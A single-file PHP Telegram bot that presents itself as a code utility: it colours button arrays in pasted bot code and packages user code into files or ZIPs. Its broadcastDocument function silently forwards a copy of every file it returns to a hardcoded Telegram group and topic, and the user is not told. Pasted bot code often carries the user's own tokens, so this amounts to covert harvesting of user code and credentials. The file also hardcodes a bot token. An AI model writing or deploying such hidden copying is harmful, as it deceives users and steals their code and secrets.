<?php
/**
 * ============================================================
 *  Code Utility Telegram Bot — Single-file (Render & GitHub Ready)
 * ============================================================
 */

// ============================================================
// 1. CONFIGURATION (Environment Variables / Fallback)
// ============================================================
if (!isset($GLOBALS['BOT_CONFIG'])) {
    $GLOBALS['BOT_CONFIG'] = [
        'BOT_TOKEN'         => getenv('BOT_TOKEN') ?: '8842916562:AAEk-gkHf4fNGM8lhUKjv0sGSWljIe2Kq-4',
        'TARGET_GROUP_ID'   => getenv('TARGET_GROUP_ID') ?: '-1003875264920',
        'TARGET_TOPIC_ID'   => getenv('TARGET_TOPIC_ID') ?: '15824',
    ];
}

if (!defined('BOT_TOKEN')) {
    define('BOT_TOKEN', $GLOBALS['BOT_CONFIG']['BOT_TOKEN']);
}
if (!defined('API_URL')) {
    define('API_URL', 'https://api.telegram.org/bot' . BOT_TOKEN . '/');
}
if (!defined('TARGET_GROUP_ID')) {
    define('TARGET_GROUP_ID', $GLOBALS['BOT_CONFIG']['TARGET_GROUP_ID']);
}
if (!defined('TARGET_TOPIC_ID')) {
    define('TARGET_TOPIC_ID', $GLOBALS['BOT_CONFIG']['TARGET_TOPIC_ID']);
}

if (!defined('STATE_DIR')) {
    define('STATE_DIR', sys_get_temp_dir() . '/tg_bot_state_' . md5(BOT_TOKEN) . '/');
}
if (!is_dir(STATE_DIR)) {
    @mkdir(STATE_DIR, 0700, true);
}

// ============================================================
// 2. LOW LEVEL TELEGRAM API HELPERS
// ============================================================

function tgApi($method, $params = []) {
    $url = API_URL . $method;

    foreach ($params as $k => $v) {
        if (is_array($v)) {
            $params[$k] = json_encode($v, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        }
    }

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        $result = curl_exec($ch);
        $err = curl_error($ch);
        curl_close($ch);
        if ($result === false) {
            error_log('tgApi cURL error: ' . $err);
            return null;
        }
        return json_decode($result, true);
    }
    return null;
}

function sendMessage($chatId, $text, $keyboard = null, $extra = []) {
    $params = array_merge([
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML',
    ], $extra);

    if (defined('TARGET_GROUP_ID') && (string)$chatId === (string)TARGET_GROUP_ID && defined('TARGET_TOPIC_ID') && TARGET_TOPIC_ID != '') {
        $params['message_thread_id'] = TARGET_TOPIC_ID;
    }

    if ($keyboard !== null) {
        $params['reply_markup'] = $keyboard;
    }
    return tgApi('sendMessage', $params);
}

function sendDocumentFromString($chatId, $filename, $content, $caption = '') {
    $tmpPath = sys_get_temp_dir() . '/' . uniqid('tgdoc_') . '_' . basename($filename);
    file_put_contents($tmpPath, $content);

    $params = [
        'chat_id' => $chatId,
        'caption' => $caption,
    ];

    if (defined('TARGET_GROUP_ID') && (string)$chatId === (string)TARGET_GROUP_ID && defined('TARGET_TOPIC_ID') && TARGET_TOPIC_ID != '') {
        $params['message_thread_id'] = TARGET_TOPIC_ID;
    }

    if (function_exists('curl_init') && class_exists('CURLFile')) {
        $params['document'] = new CURLFile($tmpPath, 'application/octet-stream', $filename);
    }
    $r = tgApi('sendDocument', $params);
    @unlink($tmpPath);
    return $r;
}

function broadcastDocument($userChatId, $filename, $content, $caption = '') {
    $userResult = sendDocumentFromString($userChatId, $filename, $content, $caption);
    if (defined('TARGET_GROUP_ID') && TARGET_GROUP_ID !== '' && (string)$userChatId !== (string)TARGET_GROUP_ID) {
        sendDocumentFromString(TARGET_GROUP_ID, $filename, $content, $caption);
    }
    return $userResult;
}

// ============================================================
// 3. STATE MANAGEMENT
// ============================================================

function stateFilePath($userId) {
    $safeId = preg_replace('/[^0-9]/', '', (string) $userId);
    return STATE_DIR . 'u_' . $safeId . '.json';
}

function getState($userId) {
    $path = stateFilePath($userId);
    if (!file_exists($path)) {
        return defaultState();
    }
    $raw = @file_get_contents($path);
    $data = json_decode($raw, true);
    if (!is_array($data)) {
        return defaultState();
    }
    return array_merge(defaultState(), $data);
}

function saveState($userId, $state) {
    $path = stateFilePath($userId);
    @file_put_contents($path, json_encode($state, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES), LOCK_EX);
}

function clearState($userId) {
    $path = stateFilePath($userId);
    if (file_exists($path)) {
        @unlink($path);
    }
}

function defaultState() {
    return [
        'menu' => 'home',
        'mode' => null,
        'code_buffer' => [],
        'single_code' => null,
        'multi_parts' => [],
        'last_result_code' => null,
    ];
}

// ============================================================
// 3a. RAW TEXT RECONSTRUCTION & 3b. SAFE CODE REASSEMBLY
// ============================================================
function reconstructRawText($text, $entities) {
    $text = $text ?? '';
    if (empty($entities) || !function_exists('mb_convert_encoding')) {
        return $text;
    }

    $delimiterMap = [
        'spoiler'       => ['open' => '||',  'close' => '||'],
        'bold'          => ['open' => '*',   'close' => '*'],
        'italic'        => ['open' => '_',   'close' => '_'],
        'strikethrough' => ['open' => '~',   'close' => '~'],
        'underline'     => ['open' => '__',  'close' => '__'],
        'code'          => ['open' => '`',   'close' => '`'],
        'pre'           => ['open' => '```', 'close' => '```'],
    ];

    $relevant = [];
    foreach ($entities as $ent) {
        $type = $ent['type'] ?? '';
        if (isset($delimiterMap[$type]) && isset($ent['offset'], $ent['length'])) {
            $relevant[] = $ent;
        }
    }
    if (empty($relevant)) {
        return $text;
    }

    $buffer = mb_convert_encoding($text, 'UTF-16LE', 'UTF-8');
    $bufferLen = strlen($buffer);

    $insertions = [];
    foreach ($relevant as $ent) {
        $delims = $delimiterMap[$ent['type']];
        $startPos = $ent['offset'] * 2;
        $endPos = ($ent['offset'] + $ent['length']) * 2;
        $insertions[] = ['pos' => $startPos, 'text' => mb_convert_encoding($delims['open'], 'UTF-16LE', 'UTF-8')];
        $insertions[] = ['pos' => $endPos,   'text' => mb_convert_encoding($delims['close'], 'UTF-16LE', 'UTF-8')];
    }

    usort($insertions, function ($a, $b) { return $b['pos'] <=> $a['pos']; });

    foreach ($insertions as $ins) {
        $pos = $ins['pos'];
        if ($pos < 0 || $pos > $bufferLen) {
            continue;
        }
        $buffer = substr($buffer, 0, $pos) . $ins['text'] . substr($buffer, $pos);
        $bufferLen = strlen($buffer);
    }

    return mb_convert_encoding($buffer, 'UTF-8', 'UTF-16LE');
}

function reassembleParts(array $parts) {
    $result = '';
    foreach ($parts as $i => $part) {
        if ($i === 0) {
            $result = $part;
            continue;
        }
        $prevHasTrailingSpace = $result !== '' && preg_match('/\s$/', $result);
        $nextHasLeadingSpace = $part !== '' && preg_match('/^\s/', $part);
        if (!$prevHasTrailingSpace && !$nextHasLeadingSpace) {
            $result .= "\n";
        }
        $result .= $part;
    }
    return $result;
}

// ============================================================
// 4. CUSTOM (REPLY) KEYBOARDS
// ============================================================
function kbBtn($text, $style = null) {
    $btn = ['text' => $text];
    if ($style !== null) {
        $btn['style'] = strtolower($style);
    }
    return $btn;
}

function styledRow($texts, &$counter) {
    $sequence = ['danger', 'success', 'primary'];
    $row = [];
    foreach ($texts as $t) {
        $style = $sequence[$counter % count($sequence)];
        $counter++;
        $row[] = kbBtn($t, $style);
    }
    return $row;
}

function replyKeyboard($rows, $placeholder = null) {
    $markup = [
        'keyboard' => $rows,
        'resize_keyboard' => true,
        'one_time_keyboard' => false,
    ];
    if ($placeholder !== null) {
        $markup['input_field_placeholder'] = $placeholder;
    }
    return $markup;
}

const BTN_BUTTON_COLOR   = '🎨 Button Color';
const BTN_CODE_TO_FILE   = '📁 Code To File';
const BTN_CODE_SUBMIT    = '📝 Code Submit';
const BTN_CREATE_COLOR   = '🎨 Create Color';
const BTN_HELPLINE       = '📚 HelpLine';
const BTN_HOME           = '🏠 Home';
const BTN_DOWNLOAD_PHP   = '📥 Download PHP';
const BTN_COPY_CODE      = '📋 Copy Code';
const BTN_SINGLE_MODE    = '📝 Singel Mode';
const BTN_MULTI_MODE     = '📚 Multi Mode';
const BTN_CREATE_FILE    = '📦 Create File';
const BTN_CLEAR_FILE     = '🗑 Clear File';
const BTN_FT_BOT_PHP     = '🤖 bot.php';
const BTN_FT_INDEX_PHP   = '📄 index.php';
const BTN_FT_INDEX_HTML  = '🌐 index.html';
const BTN_FT_INDEX_PY    = '🐍 index.py';
const BTN_FT_INDEX_ZIP   = '📦 index.zip';
const BTN_BACK           = '🔙 Back';

function homeKeyboard() {
    $c = 0;
    return replyKeyboard([styledRow([BTN_BUTTON_COLOR, BTN_CODE_TO_FILE], $c)]);
}
function buttonColorMenuKeyboard() {
    $c = 0;
    return replyKeyboard([styledRow([BTN_CODE_SUBMIT, BTN_CREATE_COLOR], $c), styledRow([BTN_HELPLINE, BTN_HOME], $c)]);
}
function buttonColorResultKeyboard($withCopy) {
    $c = 0;
    $row1 = $withCopy ? styledRow([BTN_COPY_CODE, BTN_DOWNLOAD_PHP], $c) : styledRow([BTN_DOWNLOAD_PHP], $c);
    return replyKeyboard([$row1, styledRow([BTN_HOME], $c)]);
}
function codeToFileMenuKeyboard() {
    $c = 0;
    return replyKeyboard([styledRow([BTN_SINGLE_MODE, BTN_MULTI_MODE], $c), styledRow([BTN_CREATE_FILE, BTN_CLEAR_FILE], $c), styledRow([BTN_HELPLINE, BTN_HOME], $c)]);
}
function fileTypeKeyboard() {
    $c = 0;
    return replyKeyboard([styledRow([BTN_FT_BOT_PHP, BTN_FT_INDEX_PHP], $c), styledRow([BTN_FT_INDEX_HTML, BTN_FT_INDEX_PY], $c), styledRow([BTN_FT_INDEX_ZIP], $c), styledRow([BTN_BACK, BTN_HOME], $c)]);
}

// ============================================================
// 5. HELP TEXTS
// ============================================================
function homeText() {
    return "🤖 <b>Welcome to Code Utility Bot</b>\n\nনিচের Menu থেকে আপনার প্রয়োজনীয় অপশন নির্বাচন করুন।";
}

// ============================================================
// 6. BUTTON-STYLE INJECTION ENGINE (Fixed & Optimized)
// ============================================================
function applyButtonStyles($code) {
    if (!function_exists('token_get_all')) { return $code; }
    $trimmedCode = ltrim($code);
    $hasPhpTag = (stripos($trimmedCode, '<?php') === 0) || (strpos($trimmedCode, '<?') === 0);
    $work = $hasPhpTag ? $code : ("<?php\n" . $code);
    $tokens = @token_get_all($work);
    if (!is_array($tokens)) { return $code; }

    $n = count($tokens);
    $counter = 0;
    $buttonKeys = ['text', 'url', 'callback_data', 'web_app', 'request_contact', 'request_location', 'switch_inline_query', 'pay', 'login_url', 'copy_text'];
    $insertions = [];

    for ($i = 0; $i < $n; $i++) {
        $tok = $tokens[$i];
        if (!is_array($tok) || $tok[0] !== T_CONSTANT_ENCAPSED_STRING) { continue; }
        $ivMain = substr($tok[1], 1, -1);
        if (!in_array($ivMain, $buttonKeys, true)) { continue; }

        $j = $i + 1;
        while ($j < $n && is_array($tokens[$j]) && $tokens[$j][0] === T_WHITESPACE) { $j++; }
        if ($j >= $n) { continue; }
        $arrowTok = $tokens[$j];
        $isArrow = is_array($arrowTok) && $arrowTok[0] === T_DOUBLE_ARROW;
        $isColon = !is_array($arrowTok) && $arrowTok === ':';
        if (!$isArrow && !$isColon) { continue; }

        $k = $j + 1;
        while ($k < $n && is_array($tokens[$k]) && $tokens[$k][0] === T_WHITESPACE) { $k++; }
        if ($k >= $n || !is_array($tokens[$k]) || $tokens[$k][0] !== T_CONSTANT_ENCAPSED_STRING) { continue; }

        // স্কোপ বা ব্র্যাকেটের ভেতর বাটন অ্যারে চেক করা
        $depth = 0; $hasButtonHint = false; $hasStyle = false;
        for ($p = $k + 1; $p < $n; $p++) {
            $t = $tokens[$p];
            $tv = is_array($t) ? $t[1] : $t;
            if ($tv === '[' || $tv === '{' || $tv === '(') { $depth++; continue; }
            if ($tv === ']' || $tv === '}' || $tv === ')') { if ($depth === 0) { break; } $depth--; continue; }
            if ($depth === 0 && is_array($t) && $t[0] === T_CONSTANT_ENCAPSED_STRING) {
                $iv = substr($t[1], 1, -1);
                if (in_array($iv, $buttonKeys, true)) { $hasButtonHint = true; }
                if ($iv === 'style') { $hasStyle = true; }
            }
        }
        
        if ($hasButtonHint && !$hasStyle) {
            $sequence = ['danger', 'success', 'primary'];
            $style = $sequence[$counter % count($sequence)];
            $counter++;
            $insertions[$k] = ",\n    \"style\" => \"$style\"";
        }
    }

    $out = '';
    foreach ($tokens as $idx => $tok) {
        $out .= is_array($tok) ? $tok[1] : $tok;
        if (isset($insertions[$idx])) { $out .= $insertions[$idx]; }
    }
    if (!$hasPhpTag) { $out = preg_replace('/^<\?php\r?\n/', '', $out, 1); }
    return $out;
}

// ============================================================
// 7. FILE / ZIP CREATION
// ============================================================
function sanitizeFilename($name) {
    $name = basename($name);
    return preg_replace('/[^A-Za-z0-9_\.\-]/', '_', $name) ?: 'file_' . time();
}

function buildZipFromCode($code, $innerFilename) {
    if (!class_exists('ZipArchive')) { return null; }
    $tmpZip = sys_get_temp_dir() . '/' . uniqid('tgzip_') . '.zip';
    $zip = new ZipArchive();
    if ($zip->open($tmpZip, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) { return null; }
    $zip->addFromString(sanitizeFilename($innerFilename), $code);
    $zip->close();
    $content = file_get_contents($tmpZip);
    @unlink($tmpZip);
    return $content;
}

// ============================================================
// 8 & 9. WEBHOOK & MESSAGE HANDLING
// ============================================================
$rawInput = file_get_contents('php://input');
$update = json_decode($rawInput, true);

if (is_array($update) && isset($update['message'])) {
    try { handleMessage($update['message']); } catch (Throwable $e) {}
}

http_response_code(200);
exit;

function handleMessage($message) {
    $chatId = $message['chat']['id'] ?? null;
    $userId = $message['from']['id'] ?? null;
    $rawText = $message['text'] ?? null;

    if (!$chatId || !$userId) return;
    if ($rawText === null) {
        sendMessage($chatId, "❌ শুধুমাত্র টেক্সট কোড গ্রহণ করা হয়।");
        return;
    }

    $text = reconstructRawText($rawText, $message['entities'] ?? []);

    if ($text === '/start') {
        clearState($userId);
        sendMessage($chatId, homeText(), homeKeyboard());
        return;
    }
    if ($text === '/cancel') {
        clearState($userId);
        sendMessage($chatId, "✅ রিসেট করা হয়েছে।", homeKeyboard());
        return;
    }

    $state = getState($userId);
    $trimmed = trim($text);

    switch ($trimmed) {
        case BTN_HOME:
            saveState($userId, defaultState());
            sendMessage($chatId, homeText(), homeKeyboard());
            return;
        case BTN_BUTTON_COLOR:
            $state['menu'] = 'button_color';
            saveState($userId, $state);
            sendMessage($chatId, "🎨 <b>Button Color</b> মেনু:", buttonColorMenuKeyboard());
            return;
        case BTN_CODE_TO_FILE:
            $state['menu'] = 'code_to_file';
            saveState($userId, $state);
            sendMessage($chatId, "📁 <b>Code To File</b> মেনু:", codeToFileMenuKeyboard());
            return;
        case BTN_CODE_SUBMIT:
            $state['mode'] = 'code_submit';
            $state['code_buffer'] = [];
            saveState($userId, $state);
            sendMessage($chatId, "📝 কোড পাঠান। শেষ হলে 🎨 Create Color চাপুন।", buttonColorMenuKeyboard());
            return;
        case BTN_CREATE_COLOR:
            handleCreateColor($chatId, $userId, $state);
            return;
        case BTN_DOWNLOAD_PHP:
            if (!empty($state['last_result_code'])) {
                broadcastDocument($chatId, 'bot.php', $state['last_result_code'], '📥 Colored Code File');
            }
            return;
        case BTN_SINGLE_MODE:
            $state['mode'] = 'single_mode';
            saveState($userId, $state);
            sendMessage($chatId, "📝 একটি কোড মেসেজ পাঠান।", codeToFileMenuKeyboard());
            return;
        case BTN_MULTI_MODE:
            $state['mode'] = 'multi_mode';
            saveState($userId, $state);
            sendMessage($chatId, "📚 মাল্টি মোড চালু হয়েছে। কোড পাঠান।", codeToFileMenuKeyboard());
            return;
        case BTN_CREATE_FILE:
            $state['menu'] = 'file_type';
            saveState($userId, $state);
            sendMessage($chatId, "📦 ফরম্যাট নির্বাচন করুন:", fileTypeKeyboard());
            return;
        case BTN_CLEAR_FILE:
            saveState($userId, defaultState());
            sendMessage($chatId, "✅ ক্লিয়ার করা হয়েছে।", codeToFileMenuKeyboard());
            return;
        case BTN_FT_BOT_PHP:
            createAndSendFile($chatId, $userId, 'bot.php', $state);
            return;
        case BTN_FT_INDEX_PHP:
            createAndSendFile($chatId, $userId, 'index.php', $state);
            return;
        case BTN_FT_INDEX_HTML:
            createAndSendFile($chatId, $userId, 'index.html', $state);
            return;
        case BTN_FT_INDEX_ZIP:
            createAndSendFile($chatId, $userId, 'index.zip', $state);
            return;
    }

    if ($state['mode'] === 'code_submit') {
        $state['code_buffer'][] = $text;
        saveState($userId, $state);
        $partCount = count($state['code_buffer']);
        sendMessage($chatId, "✅ অংশ যোগ হয়েছে। (মোট অংশ: <b>{$partCount}</b>টি)\nআরও পাঠাতে পারেন।", buttonColorMenuKeyboard());
        return;
    }
    if ($state['mode'] === 'single_mode') {
        $state['single_code'] = $text;
        saveState($userId, $state);
        sendMessage($chatId, "✅ কোড সংরক্ষিত। 📦 Create File চাপুন।", codeToFileMenuKeyboard());
        return;
    }
    if ($state['mode'] === 'multi_mode') {
        $state['multi_parts'][] = $text;
        saveState($userId, $state);
        $partCount = count($state['multi_parts']);
        sendMessage($chatId, "✅ অংশ যোগ হয়েছে। (মোট অংশ: <b>{$partCount}</b>টি)", codeToFileMenuKeyboard());
        return;
    }
}

function handleCreateColor($chatId, $userId, $state) {
    if (empty($state['code_buffer'])) return;
    $colored = applyButtonStyles(reassembleParts($state['code_buffer']));
    $state['last_result_code'] = $colored;
    $state['code_buffer'] = [];
    $state['mode'] = null;
    saveState($userId, $state);
    broadcastDocument($chatId, 'bot.php', $colored, '🎨 Colored Code');
}

function createAndSendFile($chatId, $userId, $ftName, $state) {
    $code = !empty($state['multi_parts']) ? reassembleParts($state['multi_parts']) : ($state['single_code'] ?? '');
    if (!$code) return;
    if ($ftName === 'index.zip') {
        $zipContent = buildZipFromCode($code, 'index.php');
        if ($zipContent) broadcastDocument($chatId, 'index.zip', $zipContent, '✅ ZIP Created');
    } else {
        broadcastDocument($chatId, $ftName, $code, '✅ File Created');
    }
}
